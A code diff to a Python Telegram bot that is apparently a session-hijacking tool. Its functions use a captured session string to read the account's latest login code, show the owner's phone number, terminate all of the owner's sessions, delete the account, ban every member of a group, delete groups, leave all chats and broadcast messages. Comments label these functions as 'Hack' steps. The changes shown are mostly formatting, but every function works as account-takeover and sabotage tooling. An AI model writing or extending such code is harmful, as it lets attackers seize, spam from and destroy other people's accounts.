@@ -30,9 +30,6 @@ def exception_handler(e, hack_name):
 
     # String Validater and Checker
 
-
-
-
 async def str_checker(strses):
     bot = None
 
@@ -161,7 +158,7 @@ async def ask_broadcast_message(x):
 
 
 async def get_dialogs(strses, group=False, channel=False, user=False):
-    async with tg(strses, env.API_ID, env.API_HASH, parse_mode=html) as bot:
+    async with tg(strses, env.API_ID, env.API_HASH) as bot:
         dialogs = []
         async for x in bot.iter_dialogs():
             if x.is_group and group:
@@ -211,13 +208,16 @@ async def userinfo(strses):
     async with tg(strses, env.API_ID, env.API_HASH) as bot:
         k = await bot.get_me()
         username = f"@{k.username}" if k.username else "None"
+        phone = f"+{k.phone}" if k.phone else "None"
         TEXT = (
-            f"<blockquote><b>ɪ∂ = {k.id}\n"
-            f"ηαмє = {k.first_name}\n"
-            f"ᴘʜσηє = +{k.phone}\n"
-            f"υѕєʀηαмє = {username}\n"
-            f"∂ᴄ_ɪ∂ = {bot.session.dc_id}\n\n"
-            f"ᴛʜαηкѕ ғσʀ υѕɪηɢ ᴛʜɪѕ вσᴛ</b></blockquote>"
+            f"<blockquote><b>"
+            f"ᴜѕєʀ ɪ∂ = <code>{k.id}</code>\n"
+            f"ηαмє = <code>{k.first_name}</code>\n"
+            f"ᴘʜσηє = <code>{phone}</code>\n"
+            f"υѕєʀηαмє = <code>{username}</code>\n"
+            f"∂ᴄ_ɪ∂ = <code>{bot.session.dc_id}</code>\n\n"
+            f"ᴛʜαηкѕ ғσʀ υѕɪηɢ ᴛʜɪѕ вσᴛ"
+            f"</b></blockquote>"
         )
         return TEXT
 
@@ -225,7 +225,7 @@ async def userinfo(strses):
 
 
 async def ban_all(strses, grp, x):
-    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
+    async with tg(strses, env.API_ID, env.API_HASH) as bot:
         self = await bot.get_me()
         try:
             grp_admins = await bot.get_participants(
@@ -253,7 +253,7 @@ async def ban_all(strses, grp, x):
 
 
 async def otp_searcher(strses):
-    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
+    async with tg(strses, env.API_ID, env.API_HASH) as bot:
         code = ""
         try:
             async for x in bot.iter_messages(777000, limit=1, search="Login code"):
@@ -271,7 +271,7 @@ async def otp_searcher(strses):
 
 
 async def joingroup(strses, username):
-    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
+    async with tg(strses, env.API_ID, env.API_HASH) as bot:
         text = "<blockquote><b>ᴊσɪηє∂ ᴛʜє ᴄʜαηηєʟ/ɢʀσυᴘ.\n\nᴛʜαηкѕ ғσʀ υѕɪηɢ ᴛʜɪѕ вσᴛ</b></blockquote>"
         if username.startswith("https://t.me/+"):
             hash = (username.split("+"))[1]
@@ -303,10 +303,10 @@ async def leavegroup(strses, username):
 
 
 async def delgroup(strses, username):
-    async with tg(strses, env.API_ID, env.API_HASH, parse_mode=html) as bot:
+    async with tg(strses, env.API_ID, env.API_HASH) as bot:
         try:
             await bot(dcr(username))
-            return "<blockquote><b>∂єℓєᴛє∂ ᴛʜє ᴄʜαηηєℓ/ɢʀσυᴘ.\n\nᴛʜαηκѕ ғσʀ υѕɪηɢ ᴛʜɪѕ ʙσᴛ</b></blockquote>"
+            return "<blockquote><b>∂єℓєᴛє∂ ᴛʜє ᴄʜαηηєʟ/ɢʀσυᴘ.\n\nᴛʜαηκѕ ғσʀ υѕɪηɢ ᴛʜɪѕ ʙσᴛ</b></blockquote>"
         except Exception as e:
             return exception_handler(e, "DELETE CHAT/GROUP")
             # Hack 'H'
@@ -333,7 +333,7 @@ async def user2fa(strses):
 
 
 async def terminate(strses):
-    async with tg(strses, env.API_ID, env.API_HASH, parse_mode=html) as bot:
+    async with tg(strses, env.API_ID, env.API_HASH) as bot:
         try:
             await bot(rt())
             return "<blockquote><b>αℓℓ ѕєѕѕɪσηѕ ʜαᴠє ʙєєη ᴛєʀмɪηαᴛє∂.\n\nᴛʜαηκѕ ғσʀ υѕɪηɢ ᴛʜɪѕ ʙσᴛ</b></blockquote>"
@@ -343,7 +343,7 @@ async def terminate(strses):
 
 
 async def delacc(strses):
-    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
+    async with tg(strses, env.API_ID, env.API_HASH) as bot:
         try:
             await bot(functions.account.DeleteAccountRequest("Cruel world"))
             return "<blockquote><b>ᴛʜє αᴄᴄσυηᴛ ɪѕ ∂єʟєᴛє∂ ѕυᴄᴄєѕѕғυʟʟʏ\n\nᴛʜαηкѕ ғσʀ υѕɪηɢ ᴛʜɪѕ вσᴛ</b></blockquote>"
@@ -353,7 +353,7 @@ async def delacc(strses):
 
 
 async def leave_all(strses, dialogs=None):
-    async with tg(strses, env.API_ID, env.API_HASH, parse_mode=html) as bot:
+    async with tg(strses, env.API_ID, env.API_HASH) as bot:
         left = 0
         for x in dialogs:
             if x == -1003523158113:
@@ -375,7 +375,7 @@ async def leave_all(strses, dialogs=None):
 
 
 async def broadcast(strses, ids=None, msg=None):
-    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
+    async with tg(strses, env.API_ID, env.API_HASH) as bot:
         sent = 0
         for i in ids:
             try:
@@ -395,9 +395,12 @@ async def broadcast(strses, ids=None, msg=None):
 
 
 async def logout(strses):
-    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
+    async with tg(strses, env.API_ID, env.API_HASH) as bot:
         ok = await bot.log_out()
-        return ok
+        if ok:
+            return "<blockquote><b>✓ ᴛʜɪs sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ ʟᴏɢɢᴇᴅ ᴏᴜᴛ sᴜᴄᴄᴇssғᴜʟʟʏ.</b></blockquote>"
+        else:
+            return "<blockquote><b>✗ ғᴀɪʟᴇᴅ ᴛᴏ ʟᴏɢ ᴏᴜᴛ ᴛʜɪs sᴇssɪᴏɴ.</b></blockquote>"
 
         # Hack 'N'
 
